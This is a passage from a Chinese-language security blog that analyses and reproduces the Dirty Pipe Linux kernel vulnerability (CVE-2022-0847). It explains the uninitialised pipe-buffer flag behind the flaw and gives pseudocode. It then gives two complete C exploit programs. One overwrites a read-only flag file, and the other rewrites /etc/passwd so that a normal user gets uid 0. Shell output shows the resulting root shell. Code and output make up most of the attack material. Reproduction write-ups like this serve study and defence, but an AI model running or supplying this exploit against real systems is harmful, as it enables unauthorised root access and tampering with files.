<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pipe_buf_can_merge(buf) &amp;&amp; offset + chars &lt;= PAGE_SIZE) &#123;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">pipe_buf_can_merge</span><span class="params">(struct pipe_buffer *buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> buf-&gt;ops == &amp;anon_pipe_buf_ops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux 5.8 中又将 <code>pipe_buf_operations</code> 类型的比较修改为 <code>pipe_buffer</code>的一个 flag：<code>PIPE_BUF_FLAG_CAN_MERGE</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123;</span><br></pre></td></tr></table></figure>
<p>Linux 4.9 添加了两个新函数 <code>copy_page_to_iter_pipe</code> 和 <code>push_pipe</code> ，它们分配了新的管道缓冲区，但并没有初始化 flag（当时 flag 的作用并不大）</p>
<p>Linux 5.8 对 flag 有所运用，没有初始化 flag，意味着之前遗留下来的 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位不会被 <code>splice</code> 系统调用清空，这可能会影响后续某些函数的执行流程</p>
<p>漏洞利用的思路为：</p>
<ul>
<li>创建管道</li>
<li>用任意数据填充管道（为整个缓冲区环结构设置 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标记）</li>
<li>清空管道（保留 <code>pipe_inode_info</code> 环中每一个缓冲区的 flag ）</li>
<li>使用 <code>splice</code> 将目标文件（以只读方式打开）中的数据从目标偏移之前的位置放入到管道中</li>
<li>将任意数据写入管道，此数据将覆盖缓存的文件页面，而不是创建新的匿名缓冲区 </li>
</ul>
<p>伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pipe(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 完全填充管道,每个pipe_buffer现在将拥PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line"><span class="keyword">for</span> (r = pipe_size ; r &gt; <span class="number">0</span> ; )&#123; </span><br><span class="line">    n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">    write(p[<span class="number">1</span>], buffer, n);   </span><br><span class="line">    r -= n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 排空管道,释放所有pipe_buffer实例(但是保留标志初始化) */</span></span><br><span class="line"><span class="keyword">for</span> (r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">    n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">    read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">    r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;target&quot;</span>, O_RDONLY); </span><br><span class="line">--offset;</span><br><span class="line">splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>); <span class="comment">/* 将指定偏移量之前的一个字节拼接到管道,这将添加对页面缓存的引用,但PIPE_BUF_FLAG_CAN_MERGE的状态依然有效 */</span></span><br><span class="line"></span><br><span class="line">write(p[<span class="number">1</span>], data, data_size); <span class="comment">/* 不会创建新的pipe_buffer,而是会写入页面缓存 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>调用 <code>splice</code> 函数可以通过“零拷贝”的形式将文件发送到 pipe（代码层面的零拷贝是直接将文件缓存页 page cache 作为 pipe 的缓存页使用）</li>
<li>但这里引入了一个变量未初始化漏洞，导致文件缓存页会在后续 pipe 通道中被当成普通 pipe 缓存页而被“续写”进而被篡改</li>
<li>然而，在这种情况下，因为没有其他可写权限的程序进行 write 操作，所以内核并不会将这个缓存页判定为“脏页”，短时间内(到下次重启之类的)不会刷新到磁盘</li>
<li>在这段时间内所有访问该文件的场景都将使用被篡改的文件缓存页，也就达成了一个“短时间内对任意可读文件任意写”的操作</li>
</ul>
<p><strong>Dirty Pipe 漏洞复现</strong></p>
<p>1.修改服务器上 flag 文件的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare_pipe</span><span class="params">(<span class="keyword">int</span> p[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> path = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;lag&#123;pipeeee&#125;&quot;</span>; </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line">        <span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> end_offset = offset + (<span class="keyword">loff_t</span>)data_size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> fd = open(path, O_RDONLY); </span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">                perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;st.st_size:0x%lx\n&quot;</span>,st.st_size);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">        prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">        --offset;</span><br><span class="line">        <span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果如下：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;yhellow&#125;</span><br><span class="line">/ $ ./exp</span><br><span class="line">st.st_size:0xe</span><br><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;pipeeee&#125;</span><br></pre></td></tr></table></figure>
<p>2.修改 <code>/etc/passwd</code> 中用户的 uid 和组 id 来实现提权：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare_pipe</span><span class="params">(<span class="keyword">int</span> p[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> path = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">loff_t</span> offset = <span class="number">30</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;test:x:0:0:,,,,,,,,,,,,,,,:/root:/bin/sh&quot;</span>; </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line">        <span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> end_offset = offset + (<span class="keyword">loff_t</span>)data_size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> fd = open(path, O_RDONLY); </span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">                perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;st.st_size:0x%lx\n&quot;</span>,st.st_size);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">        prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">        --offset;</span><br><span class="line">        <span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>因为 <code>su</code> 命令需要 root 权限，所以在 root 用户中进行测试</li>
<li>结果如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /etc/passwd </span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/sh</span><br><span class="line">test:x:<span class="number">1000</span>:<span class="number">1000</span>:note:/home/test:/bin/sh</span><br><span class="line">/ # ./<span class="built_in">exp</span></span><br><span class="line">st.st_size:<span class="number">0x47</span></span><br><span class="line">/ <span class="meta"># cat /etc/passwd </span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/sh</span><br><span class="line">test:x:<span class="number">0</span>:<span class="number">0</span>:,,,,,,,,,,,,,,,:/root:/bin/sh</span><br><span class="line">/ <span class="meta"># su test</span></span><br><span class="line">/ <span class="meta"># whoami</span></span><br><span class="line">root</span><br><span class="line">/ <span class="meta"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span> groups=<span class="number">0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>切换到 test 用户以后，还是显示 root 权限</li>
</ul>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/void_zk/article/details/125884637?app_version=5.8.1&amp;code=app_1562916241&amp;csdn_share_tail={&quot;type&quot;%3A&quot;blog&quot;%2C&quot;rType&quot;%3A&quot;article&quot;%2C&quot;rId&quot;%3A&quot;125884637&quot;%2C&quot;source&quot;%3A&quot;m0_67072125&quot;}&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app">DirtyPipe(CVE-2022-0847) 脏管漏洞复现分析</a> </li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/480663969#:~:text=通过注入PIPE_BUF_FLAG_CAN_MERGE标记到页面缓存，当新数据写入到以特殊方式初始化的管道中时将可以覆盖页面缓存中的数据。,3x 利用">CVE-2022-0847漏洞对容器环境影响的深度分析</a> </li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/23/Linux%20%E5%90%84%E7%A7%8D%E5%86%85%E5%AD%98%E5%85%B1%E4%BA%AB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/23/Linux%20%E5%90%84%E7%A7%8D%E5%86%85%E5%AD%98%E5%85%B1%E4%BA%AB/" class="post-title-link" itemprop="url">Linux 各种内存共享</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

